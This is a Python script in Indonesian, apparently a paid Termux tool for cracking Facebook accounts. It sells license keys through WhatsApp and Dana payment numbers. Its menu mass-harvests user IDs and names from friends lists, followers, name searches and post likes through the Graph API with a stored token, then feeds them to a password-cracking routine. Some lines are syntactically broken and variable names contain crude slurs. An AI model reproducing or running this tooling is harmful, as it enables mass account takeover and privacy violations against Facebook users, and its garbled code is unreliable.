#Terima Kasih Kepada
#Mr.Risky, Jeeck, Ratu Error, Dan Grup XnxCode

import os,sys
try: import requests
except ModuleNotFoundError:print("[!] Sedang Install Module requests");os.system("python -m pip install requests &> /dev/null")
try: import bs4
except ModuleNotFoundError:print("[!] Sedang Install Module bs4");os.system("python -m pip install bs4 &> /dev/null")
try: import mechanize
except ModuleNotFoundError:print("[!] Sedang Install Module mechanize");os.system("python -m pip install mechanize &> /dev/null")
try: import gTTS
except ModuleNotFoundError: os.system("python -m pip install gTTS &> /dev/null")
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,ipaddress,calendar,requests,mechanize,bs4,sys,os,subprocess,uuid,requests,sys,random,time,re,base64,json,platform
import sys, os, subprocess, platform, struct
import os, sys, re, time, requests, calendar, random, bs4, subprocess, uuid, json 
import requests as req
#import requests as re
import time,random,json
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as par
from bs4 import BeautifulSoup
from random import choice as pilih
from concurrent.futures import ThreadPoolExecutor as __Kiky__
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from datetime import datetime 
from urllib.parse import quote 
from datetime import date 
null=open(os.devnull, "w")
insta= subprocess.call(["dpkg","-s","play-audio"],stdout=null,stderr=subprocess.STDOUT)
null.close()
if insta !=0:os.system('pkg install play-audio -y &> /dev/null')
try:os.mkdir("dump")
except:pass
try:os.mkdir("Hasil")
except:pass
if ("linux" in sys.platform.lower()):
	II='\x1b[1;32m'
	I='\x1b[0;32m'
	C='\x1b[0;36m'
	M='\x1b[0;31m'
	U='\x1b[0;35m'
	K='\x1b[0;33m'
	P='\x1b[00m'
	H='\x1b[0;90m'
	Q="\x1b[00m"
	O='\033[38;2;255;127;0;1m' #ORANGE
	B = '\x1b[0;94m' # BIRU.
	war = f"[{C}•{Q}]-->"
else:
	II=''
	I=''
	C=''
	M=''
	U=''
	K=''
	P=''
	H=''
	Q=""
	O='' #ORANGE
	B='' # BIRU.
	war = "[•]-->"




jarak = "     "
ubahP = []
pwbaru = []
data = {}
data2 = {}
loop = 0
loop = 0
ok = []
cp = []
ttl = []
id = []
nampung = []
data,data2={},{}
ubahP,pwBaru=[],[]



###### >>>> SETINGAN JAM ATAU TANGGAL
current = datetime.now()
durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day
current = datetime.now()
waktuu = str(datetime.now().strftime("%Y-%m-%d"))
waktu = str(datetime.now().strftime("%Y%m%d"))
jamz = datetime.now().strftime('%H:%M:%S')
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}




#####  BAGIAN DEF ATAU CLASS #####
def jalan(z):
	for e in z + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.009)
def play_mpv(x):
	try:os.popen("play-audio "+x)
	except:pass

import uuid
class menu:
	def __init__(self):
		os.system('clear')
		self.mani()
#		crackmenu("").check_opsi()
	def buat_tgl(self):
		global wak_
		os.system("clear")
		try:
			id1 = open(".datame1", "r").read()
			idl = open(".datame1", "r").read()
		except:
			self.konfo()
		gig = requests.get("https://github.com/DmiRiau/kontol/blob/main/Infokan").text.strip()
		if idl in gig:
			jok = gig.split(idl+"|")
			jokk = ("%s"%(jok[1]))
			jokkk = jokk.split("<")
			wakk = jokkk[0]
			if wakk == "":
				self.konfo()
		else:
			self.konfo()

	def lanjut_x(self):
		try:
			id1 = open(".datame1", "r").read()
		except:
			id1 = uuid.uuid4().hex[:43].upper()
			jaa = open(".datame1", "w")
			jaa.write(id1)
			jaa.close()
		no_wa = "6283893415477"
		url_wa = ("https://api.whatsapp.com/send?phone="+no_wa+"&text=") # UBAH NOMOR HP KAMU
		jalan(war+'Licese Anda : '+U+id1+Q)
		jalan(war+'Silahkan Chat *'+C+'Mr.Risky'+Q+'* Untuk Membeli Key !')
		jalan(f"""{war}Method Pembayaran
 |
 |-->Dana   |--> {U}083143565470 {Q}
 |
{war}Informasi/MRS
 |
 |-->Whatsapp ( {U}+8801773276144{Q})
 |
{war}Pesan Admin SHIPON
 |
 |-->Admin Tidak Bertanggung Jawab Atas Terjadinya Masalah !
 |-->Jika Anda Mau Membeli License/Key Harap Kirim Bukti Transaksi/Tranfer
 |-->Admin Tidak Menerima Penawaran/Tawar Menawar
 |
{war}Thanks to
 |-->{I}Allah SWT{Q}
 |-->Mamah {M}♥♥{Q}
 |-->Bapak {I}>_<{Q}
 |
 |
 |-->{C}Ratu Error{Q}
 |-->{I}Mr.Risky{Q}
 |-->Mr.Jeeck
 |-->Wans X Gans
 |
{war}{O}Silahkan Pilih Harga License...{Q}
 |
 |-->1. 1 Minggu      (Rp{II}25.000{Q})
 |-->2. 1 Bulan       (Rp{II}50.000{Q})
 |-->3. {M}Permanent  (Rp{II}250.000{Q})
 |""")
		pok = input(' |-->Pilih : ')
		if pok in (""," "):
			jalan(" |-->Jangan Kosong...")
			time.sleep(2)
			self.lanjut_x()
		elif pok in ("1","01"):
			tks = ("Halo Kak, Saya Mau Beli Key/License Yang 1 Minggu.\nKey/License : *"+id1+"*")
			subprocess.check_output(["am", "start", ]) text
		elif pok in ("2","02"):
			tks = ("Halo Kak, Saya Mau Beli Key/License Yang 1 Bulan.\nKey/License : *"+id1+"*")
			subprocess.check_output(["am", "start", https://github.com/SHIPONmrs/aprovelq.txt/tree/main]) text
		elif pok in ("3","03"):
			tks = ("Halo Kak, Saya Mau Beli Key/License Yang 1 Minggu.\nKey/License : *"+id1+"*")
			subprocess.check_output(["am", "start", https://github.com/SHIPONmrs/aprovelq.txt/tree/main]) text
		else:
			jalan(' |-->Maaf Pilihan Yang Anda Pilih Tidak Ada....')
			time.sleep(2)
			self.lanjut_x()
		os.sys.exit()

	def buat_key_gratis(self):

		key = requests.get("https://github.com/SHIPONmrs/aprovelq.txt/tree/main").text
		jaa = open(".datame1", "w")
		jaa.write(key)
		jaa.close()
		try:self.cek_tgl()
		except:pass
		jalan(war+"Berhasil Membuat Key Gratis Silahkan Jalankan Script Ini")
		os.sys.exit()

	def konfo(self):
		os.system("clear")
		try:
			id1 = open(".datame1", "r").read()
		except:
			id1 = uuid.uuid4().hex[:43].upper()
			jaa = open(".datame1", "w")
			jaa.write(id1)
			jaa.close()
		jalan(war+"Lihat Doaanngg Cuma Minta Trial")
		print(" |-->1. Beli Key/License");time.sleep(0.75)
		print(" |-->2. Gunakan Trial (Tidak Selama Gratis Kawan)");time.sleep(0.75)
		pul_ = input(" |-->Pilih : ")
		if pul_ in ([""," "]):jalan(war+"Isi Dengan Benar !!!!");time.sleep(1);self.konfo()

		elif pul_ in (["1","01"]):self.lanjut_x();os.sys.exit(),
		elif pul_ in (["2","02"]):self.buat_key_gratis();os.sys.exit()

		else:jalan(war+"Isi Dengan Benar !!!!");time.sleep(1);self.konfo()
		os.sys.exit()


	def cek_tgl(self):
		global infona
		try:
			id1 = open(".datame1", "r").read()
			idl = open(".datame1", "r").read()
		except:
			self.konfo()
		gig = requests.get("https://github.com/SHIPONmrs/aprovelq.txt/tree/main").text.strip()
		if idl in gig:
			jok = gig.split(idl+"|")
			jokk = ("%s"%(jok[1]))
			jokkk = jokk.split("<")
			wak = jokkk[0]
			jaa = open(".datame2", "w")
			jaa.write(wak)
			jaa.close()
			wak_ = open(".datame2", "r").read().split()
		else:
			self.konfo()
		try:
			tgl = datetime.now()
			bln = tgl.month
			thn = tgl.year
			day = tgl.day
			mulai = datetime(int(wak_[0]), int(wak_[1]), int(wak_[2]))
			seles = datetime(thn, bln, day)
			sisa = mulai - seles
			lim_dev_id = str(sisa).split()[0]
			if "KIKY" in "":
				infona = (II+"Ultimate/Tidak Habis²"+Q)
				return infona
			else:
				infona = (O+lim_dev_id+" Hari Lagi")
				if ":" in str(lim_dev_id) or "-" in str(lim_dev_id):
						exit(jalan(war+"Silahkan Hubungi Athour Untuk Memperpanjangankan License ! "))
						os.sys.exit()
				return infona
		except:
			jalan(f" |-->Key/License Anda : {O}{id1}{Q}")
			jalan(" |-->Maaf Key/License Anda Sudah Expires, Silahkan Hubungi Admin Script")
			jalan(f' |-->No Whatsapp : {O}+8801773276144{Q}')
			print(" |")
			print(" |")
			zib = input(f' |-->Apakah Anda Mau Hapus License/Key ({O}Y/n{Q}):')
			if zib in (""," "):
				jalan(" |-->Jangan Kosong...")
				os.sys.exit()
			elif zib in ("Y","y"):
				try:
					os.remove(".datame1")
					os.remove(".datame2")
				except:pass
				jalan(' |-->File License/Key Anda Sudah Saya Hapus....')
				os.sys.exit()
			else:
				jalan(" |-->Isi Dengan Benar Dong...")
				os.sys.exit()
			os.sys.exit()
	def tampilan_logo(self): #Logo Anak Ganteng
		xnxx = pilih([II,M,K,U,B,C,O])
		mmk  = pilih([O,M,C,U,B,Q])
		google = f"""{xnxx}___    _____    __________________\n{xnxx}__ |  / /__ |  / /____  _/___  __ \        {mmk}••{II} MODE IN INDONESIA {mmk}••{Q}\n{xnxx}__ | / /___ | / /____  /____  /_/ /        {mmk}••{II}      Mr.Risky     {mmk}••{Q}\n{xnxx}__ |/ /____ |/ /____/ /____  ____/         {mmk}••{II}       Jeeck.      {mmk}••{Q}\n{xnxx}_____/________/___/___/___/_/              {mmk}••{Q}-------------------{mmk}••{Q}\n{Q}[{C}•{Q}]-->{O}Ingfo{Q}\n |\n |-->Whatsapp : +6283893415477\n |-->Facebook : Risky(Kang Encryption)\n |-->Github   : Https://Github.com/Dumai-991\n |"""
		jalan(google)
	def mani(self):
		self.tampilan_logo()
		try:token = open(".login.txt","r").read()
		except:login()
		try:cookie = open(".cookie.txt","r").read()
		except:pass
		try:
			xnxzx = ""+cookie
			zza = "Token And Cookie"
		except:
			zza = "Token"
		try:
			nama = ses.get(f"https://graph.facebook.com/me?&access_token={token}").json()["name"]
			idz = ses.get(f"https://graph.facebook.com/me?&access_token={token}").json()["id"]
		except:
			os.system('rm -rf .login.txt')
			os.system('rm -rf .cookie.txt')
			jalan(" |-->Token Kadaluarsa")
			os.sys.exit()
		tam_menu = f"""{Q}[{C}•{Q}]-->{O}Ingfo Akun{Q}
 |
 |-->Nama Akun    : {O}{nama}{Q}
 |-->Idz Akun     : {M}{idz}{Q}
 |-->Status Login : {II}{zza}{Q}
 |
 |-->Tanggal Premium Berakhir : {K}{self.cek_tgl()}{Q}
 |
{Q}[{C}•{Q}]-->{O}Ingfo Dari Admin{Q}
 |
 |-->Script Masih Tahap Perkembangan Jadi Harap Bersabar Hinggal Update Kedepan :)
 |-->Harap Gunakan Dengan Bijak:)
 |
{Q}[{C}•{Q}]-->{O}Menu Vvip{Q}
 |
 |{Q}--------------------------------------------------->{U}Status{Q}"""
		jalan(tam_menu)
		print(f' |-->1. Crack Dari Daftar Teman ({O}Massal{Q})		{II}ON{Q}');time.sleep(0.25)
		print(f' |-->2. Crack Dari Daftar Teman				{II}ON{Q}');time.sleep(0.25)
		print(f' |-->3. Crack Dari Pengikut				{II}ON{Q}');time.sleep(0.25)
		print(f' |-->4. Crack Dari Pengikut ({O}Ultimate Dump{Q})		{II}ON{Q}');time.sleep(0.25)
		print(f' |-->5. Crack Dari Pencarian Nama ({O}Tidak Login{Q})		{II}ON{Q}');time.sleep(0.25)
		print(f' |-->6. Crack Dari Like Postingan			{II}ON{Q}');time.sleep(0.25)
		print(f' |-->7. Crack Dari Komentar				{M}OFF{Q}');time.sleep(0.25)
		print(f' |-->8. Crack Dari Member Group				{M}OFF{Q}');time.sleep(0.25)
		print(f' |-->9. Crack Dari Saran Teamn				{M}OFF{Q}');time.sleep(0.25)
		print(f' |-->10.Check Jumlah Teman ({O}Rawan Check Point{Q})		{II}ON{Q}');time.sleep(0.25)
		print(f' |-->11.Lihat Hasil Crack 				{II}ON{Q}');time.sleep(0.25)
		print(f' |-->12.Check Options Facebook Hasil Crack		{II}ON{Q}');time.sleep(0.25)
		print(f' |-->13.Bot Auto Share					{II}ON{Q}');time.sleep(0.25)
		print(f' |-->14.Report Script					{II}ON{Q}');time.sleep(0.25)
		print(f' |-->15.Ingfo Token Dan Cookies				{II}ON{Q}');time.sleep(0.25)
		print(f' |-->00.Keluar (Hapus Token)');time.sleep(0.25)
		print(f' |');time.sleep(0.25)
		pio = input(f"{Q}[{M}?{Q}]-->Pilihan : ")
		if pio in (""," "):
			jalan(" |-->Isi Dengan Benar !!");time.sleep(1)
			menu()
		elif pio in ("01","1"):
			self.public_mass()
			os.sys.exit()
		elif pio in ("02","2"):
			self.public_()
			os.sys.exit()
		elif pio in ("03","3"):
			self.follow_()
			os.sys.exit()
		elif pio in ("04","4"):
			self.dump_follow_ulti()
			os.sys.exit()
		elif pio in ("05","5"):
			self.pencarian_nologin()
			os.sys.exit()
		elif pio in ("06","6"):
			self.likes_()
			os.sys.exit()
		elif pio in ("10"):
			self.cek_jumlah_teman()
			os.sys.exit()
		elif pio in ("11"):
			self.rek()
			os.sys.exit()
		elif pio in ("12"):
			self.check_opsii()
			os.sys.exit()
		elif pio in ("13"):
			self.share_post()
			os.sys.exit()
		elif pio in ("14"):
			self.menujuwa()
			os.sys.exit()
		elif pio in ("15"):
			self.hide_tkn()
			os.sys.exit()
		elif pio in ("00"):
			os.system('rm -rf .login.txt')
			os.system('rm -rf .cookie.txt')
			jalan(" |-->Token Berhasil Dihapus...")
			os.sys.exit()
		else:
			jalan(" |-->Maaf Menu Anda Cari Tidak Ditemukan !!");time.sleep(1)
			menu()
##### Sama Aja Tapi Masaal  #####

	def public_mass(self):
		try:
			token = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			exit(war+"Token Failed !!");time.sleep(2)
		try:
			tanya_total = int(input(war+"Mau Dump Berapa Id : "))
		except:tanya_total=1
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.json','w') 
		jalan(" |-->Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
		print(" |")
		print(f"[{M}!{Q}]-->{O}Masukan Idz Atau Username Target{Q}")
		print(" |")
		for t in range(tanya_total):
			t +=1
			idt = input(" |-->Target %s : "%(t))
			try:
				if idt == "me":idt = "me"
				else:
					payload = {"fburl": "https://free.facebook.com/{}".format(idt), "check": "Lookup"}
					if "facebook" in idt:
						payload = {"fburl": idt, "check": "Lookup"}
					mmk = requests.post("https://lookup-id.com/", data=payload).content
					xxx = par(mmk, "html.parser")
					idtt = xxx.find("span", id="code")
					asw = idtt.text
					idt = asw
			except:idt = idt
			limit = ("10000")
			try:
				if idt == "me" or "me" == idt:
					otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
					op = json.loads(otw.text)
				else:
					jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
					op = json.loads(jok.text)
				try:
					nama = op['name']
				except (KeyError, IOError):
					nama = ("Nama Tidak DiTemukan !")

			except Exception as e:
				jalan("|-->Maaf ID "+C+idt+Q+" Ini Tidak DiTemukan ! ("+str(e)+")")
				continue
			jalan(" |-->Nama   : "+I+nama+Q)
			try:
				dump = open('dump/'+namafi+'.json','a+') 
				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit="+limit+"&access_token="+token).json()["data"]:
					try:
						uid = i["id"]
						nama = i["name"]
						id.append(uid+"<=>"+nama)
						dump.write(uid+'<=>'+nama+'\n')
					except:pass
				dump.close()
			except KeyError:pass
		id_ = ("%s"%(len(id)))
		if id_ == "0" or "0" == id_:
			jalan(" |-->Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!")
		else:
			print(f"[{C}•{Q}]-->Total ID : {O}%s%s"%(len(id),Q))
			jalan(" |-->Nama Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
			jalan(" |-->Silahkan Copy Nama Hasil Dump Tadi !!")
			jalan(" |-->Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : ")
			zz = input(war+'-->Pilih : ')
			if zz in ["Y", "y", "Yes", "1"]:
				crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
				exit()
			else:
				pass
		input(f"[{M}!{Q}] Tekan Enter !!")
		menu()
##### Ambik Dari Daftar Temab  #####
	def public_(self):
		try:
			token = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			exit(war+"Token Failed !!");time.sleep(2)
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.json','w') 
		jalan(" |-->Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
		print(" |")
		print(f"[{M}!{Q}]-->{O}Masukan Idz Atau Username Target{Q}")
		print(" |")
		idt = input(" |-->Target :")
		try:
			if idt == "me":idt = "me"
			else:
				payload = {"fburl": "https://free.facebook.com/{}".format(idt), "check": "Lookup"}
				if "facebook" in idt:
					payload = {"fburl": idt, "check": "Lookup"}
				mmk = requests.post("https://lookup-id.com/", data=payload).content
				xxx = par(mmk, "html.parser")
				idtt = xxx.find("span", id="code")
				asw = idtt.text
				idt = asw
		except:idt = idt
		limit = ("10000")
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Nama Tidak DiTemukan !")
		except Exception as e:
			jalan("|-->Maaf ID "+C+idt+Q+" Ini Tidak DiTemukan ! ("+str(e)+")")
			time.sleep(2)
			menu()
		jalan(" |-->Nama   : "+I+nama+Q)
		try:
			dump = open('dump/'+namafi+'.json','a+')
			for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
		id_ = ("%s"%(len(id)))
		if id_ == "0" or "0" == id_:
			jalan(" |-->Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!")
		else:
			print(f"[{C}•{Q}]-->Total ID : {O}%s%s"%(len(id),Q))
			jalan(" |-->Nama Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
			jalan(" |-->Silahkan Copy Nama Hasil Dump Tadi !!")
			jalan(" |-->Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : ")
			zz = input(war+'-->Pilih : ')
			if zz in ["Y", "y", "Yes", "1"]:
				crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
				exit()
			else:
				pass
		input(f"[{M}!{Q}] Tekan Enter !!")
		menu()
##### Ambil Idz Dari Follow  #####
	def follow_(self):
		try:
			token = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			exit(war+"Token Failed !!");time.sleep(2)
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.json','w') 
		jalan(" |-->Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
		print(" |")
		print(f"[{M}!{Q}]-->{O}Masukan Idz Atau Username Target{Q}")
		print(" |")
		idt = input(" |-->Target :")
		try:
			if idt == "me":idt = "me"
			else:
				payload = {"fburl": "https://free.facebook.com/{}".format(idt), "check": "Lookup"}
				if "facebook" in idt:
					payload = {"fburl": idt, "check": "Lookup"}
				mmk = requests.post("https://lookup-id.com/", data=payload).content
				xxx = par(mmk, "html.parser")
				idtt = xxx.find("span", id="code")
				asw = idtt.text
				idt = asw
		except:idt = idt
		limit = ("10000")
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Nama Tidak DiTemukan !")
		except Exception as e:
			jalan("|-->Maaf ID "+C+idt+Q+" Ini Tidak DiTemukan ! ("+str(e)+")")
			time.sleep(2)
			menu()
		jalan(" |-->Nama   : "+I+nama+Q)
		try:
			dump = open('dump/'+namafi+'.json','a+')
			for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
		id_ = ("%s"%(len(id)))
		if id_ == "0" or "0" == id_:
			jalan(" |-->Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!")
		else:
			print(f"[{C}•{Q}]-->Total ID : {O}%s%s"%(len(id),Q))
			jalan(" |-->Nama Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
			jalan(" |-->Silahkan Copy Nama Hasil Dump Tadi !!")
			jalan(" |-->Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : ")
			zz = input(war+'-->Pilih : ')
			if zz in ["Y", "y", "Yes", "1"]:
				crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
				exit()
			else:
				pass
		input(f"[{M}!{Q}] Tekan Enter !!")
		menu()
##### Ambil Idz Follow Ultimate  #####
	def dump_follow_ulti(self):
		nextt = ""
		try:
			token = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			exit(war+"Token Failed !!");time.sleep(2)
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.json','w') 
		jalan(" |-->Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
		print(" |")
		print(f"[{M}!{Q}]-->{O}Masukan Idz Atau Username Target{Q}")
		print(" |")
		idt = input(" |-->Target :")
		try:
			if idt == "me":idt = "me"
			else:
				payload = {"fburl": "https://free.facebook.com/{}".format(idt), "check": "Lookup"}
				if "facebook" in idt:
					payload = {"fburl": idt, "check": "Lookup"}
				mmk = requests.post("https://lookup-id.com/", data=payload).content
				xxx = par(mmk, "html.parser")
				idtt = xxx.find("span", id="code")
				asw = idtt.text
				idt = asw
		except:idt = idt
		limit = ("10000")
		try:
			if idt == "me" or "me" == idt:
				otw = requests.get("https://graph.facebook.com/me/?access_token="+token)
				op = json.loads(otw.text)
			else:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
				op = json.loads(jok.text)
			try:
				nama = op['name']
			except (KeyError, IOError):
				nama = ("Nama Tidak DiTemukan !")
		except Exception as e:
			jalan("|-->Maaf ID "+C+idt+Q+" Ini Tidak DiTemukan ! ("+str(e)+")")
			time.sleep(2)
			menu()
		limit = "5000"
		jalan(" |-->Nama   : "+I+nama+Q)
		jalan(' |-->Tekan CTRL + C Untuk Stop Dump !')

		try:
			dump = open('dump/'+namafi+'.json','a+') 
			for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+token).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
			print(" |-->Total ID : %s"%(len(open("dump/"+namafi+".json","r").readlines())))
		except:pass
		try:
			i = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=5000&access_token="+token).json()["paging"]["next"]
			self.ke_situ(i, namafi)
		except:pass
		id_ = ("%s"%(len(open("dump/"+namafi+".json","r").readlines())))
		if id_ == "0" or "0" == id_:
			jalan(" |-->Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!")
		else:
			jalan(" |-->Nama Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
			jalan(" |-->Silahkan Copy Nama Hasil Dump Tadi !!")
			jalan(" |-->Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : ")
			zz = input(war+'Pilih : ')
			if zz in ["Y", "y", "Yes", "1"]:
				crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
				exit()
			else:
				pass
		input(war+"Tekan Enter !!")
		menu()


	def ke_situ(self, xnha, namaf):
		id = []
		xnn = xnha
		namaa = namaf
		try:
			dump = open('dump/'+namaf+'.json','a+') 
			for i in requests.get(xnha).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
		print(" |-->Total ID : %s"%(len(open("dump/"+namaf+".json","r").readlines())))
		try:
			i = requests.get(xnha).json()["paging"]["next"]
			self.ke_situ(i, namaa)
		except:pass
##### Ambil Dari Pencarinaan  #####
	def pencarian_nologin(self):
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.json','w')
		jalan(" |-->Hasil Dump Dari Pencarian Nama DiSimpan : "+O+"dump/"+namafi+".json"+Q)
		try:jum = int(input(" |-->Jumlah Target : "))
		except:jum = 1
		print(f" |-->{O}Masukan Nama Target{Q}")
		print(" |")
		for t in range(jum):
			t +=1
			idt = input(f" |-->Nama : ")
			print(" |")
			self.dump_pencarian(f"https://mbasic.facebook.com/public/{idt}?/locale2=id_ID",namafi)
		crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
		exit()

	def dump_pencarian(self,link,namfi):
		r = parser(ses.get(str(link)).text,'html.parser')
		namaqq = namfi
		try:
			for x in r.find_all('td'):
				try:
					data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x)) 
					for uid,nama in data:
						if 'profile.php?' in uid:
							uid = re.findall('id=(.*)',str(uid))[0]
						elif '<span' in nama:
							nama = re.findall('(.*?)\<',str(nama))[0]
						id.append(uid+'<=>'+nama)
						open('dump/'+namfi+'.json','a+').write(uid+'<=>'+nama+'\n')
					link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
					if(link):
						sys.stdout.write(f"\r |-->Sedang Mengumpulkan {O}{len(id)}{Q} Idz..."),
						sys.stdout.flush()
						self.dump_pencarian(link,namaqq)
				except KeyboardInterrupt:break
				except:pass
		except KeyboardInterrupt:
			os.sys.exit()
##### Ambil Dari Like  #####
	def likes_(self):
		try:
			token = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			exit(war+"Token Failed !!");time.sleep(2)
		namafi = uuid.uuid4().hex[:10].upper()
		dump = open('dump/'+namafi+'.json','w') 
		print(" |")
		print(" |")
		print(f"[{M}!{Q}]-->{O}Masukan Idz Postingan{Q}")
		print(" |")
		idt = input(" |-->Target :")
		try:
			dump = open('dump/'+namafi+'.json','a+')
			for i in requests.get("https://graph.facebook.com/%s/likes?limit=5000&access_token=%s"%(idt, token)).json()["data"]:
				try:
					uid = i["id"]
					nama = i["name"]
					id.append(uid+"<=>"+nama)
					dump.write(uid+'<=>'+nama+'\n')
				except:pass
			dump.close()
		except KeyError:pass
		id_ = ("%s"%(len(id)))
		if id_ == "0" or "0" == id_:
			jalan(" |-->Kemungkinan Idz Yang Anda Masukan Tidak DiPublickan !!")
		else:
			print(f"[{C}•{Q}]-->Total ID : {O}%s%s"%(len(id),Q))
			jalan(" |-->Nama Hasil Dump : "+I+"dump/"+namafi+".json"+Q)
			jalan(" |-->Silahkan Copy Nama Hasil Dump Tadi !!")
			jalan(" |-->Apakah Anda Mau Lasung Crack Dengan File Ini (Y/n) : ")
			zz = input(war+'-->Pilih : ')
			if zz in ["Y", "y", "Yes", "1"]:
				crackmenu("dump/"+namafi+".json").passmenu("dump/"+namafi+".json")
				exit()
			else:
				pass
		input(f"[{M}!{Q}] Tekan Enter !!")
		menu()

##### Check Jumlah Teman  #####
	def cek_jumlah_teman(self):
		try:
			token = open(".login.txt", "r").read()
			toket = open(".login.txt", "r").read()
		except IOError:
			os.system("rm -rf .login.txt")
			os.sys.exit(war+"Token Failed !!");time.sleep(2)
		print(' |')
		jalan(" |-->Ketik >"+I+"me"+Q+"< Untuk Dump Data Sendiri")
		jalan(" |-->Masukan Idz Atau Username Target")
		print(' |')
		idt = input(" |-->Target :")
		try:
			if idt == "me":idt = "me"
			else:
				payload = {"fburl": "https://free.facebook.com/{}".format(idt), "check": "Lookup"}
				if "facebook" in idt:
					payload = {"fburl": idt, "check": "Lookup"}
				mmk = requests.post("https://lookup-id.com/", data=payload).content
				xxx = par(mmk, "html.parser")
				idtt = xxx.find("span", id="code")
				asw = idtt.text
				idt = asw
		except:idt = idt
		dump = open('.janganedit','w') 
		try:
			dump = open('.janganedit','a+') 
			for i in requests.get("https://graph.facebook.com/"+idt+"/friends?limit=9999&access_token="+token).json()["data"]:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"<=>"+nama)
				dump.write(uid+'<=>'+nama+'\n')
			dump.close()
		except KeyError:pass
		id_ = ("%s"%(len(id)))
		if id_ == "0" or "0" == id_:
			jalan(" |-->Kemungkinan Id "+idt+" Ini Tidak DiPublickan !!")
			time.sleep(2)
			self.cek_jumlah_teman()
		else:
			print(" |-->Total ID : %s"%(len(id)))
			with __Kiky__(max_workers=20) as (kiky_gtg):
				juma = open(".janganedit","r").readlines()
				for data in juma:
					data = data.replace("\n","")
					kiky = data.split("<=>")
					mal = ("%s"%(kiky[0]))
					nm = ("%s"%(kiky[1]))
					kiky_gtg.submit(self.lonte_, mal, toket, token)
	def lonte_(self, ml, token, toket):
		try:
			goblok = []
			tolol = []
			for i in requests.get("https://graph.facebook.com/"+ml+"/friends?limit=9999&access_token="+token).json()["data"]:
				anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol = i["id"]
				goblok.append(anak_kontol_anak_anjing_pantek_lonte_bentar_lagi_mau_tahun_baru_kontol)
			for i in requests.get("https://graph.facebook.com/"+ml+"/subscribers?limit=9999&access_token="+token).json()["data"]:
